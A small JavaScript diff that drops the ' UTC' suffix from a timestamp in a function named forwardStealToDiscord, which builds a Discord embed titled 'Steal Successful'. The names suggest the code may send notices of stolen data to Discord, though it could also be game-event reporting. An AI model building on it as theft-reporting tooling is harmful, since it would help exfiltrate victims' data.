@@ -184,7 +184,7 @@ async function forwardStealToDiscord(payload) {
 
   const ping = discordId ? `<@${discordId}>` : null;
   const now = new Date();
-  const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', timeZone: 'UTC' }) + ' UTC';
+  const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', timeZone: 'UTC' });
 
   const embed = {
     title: 'Steal Successful',
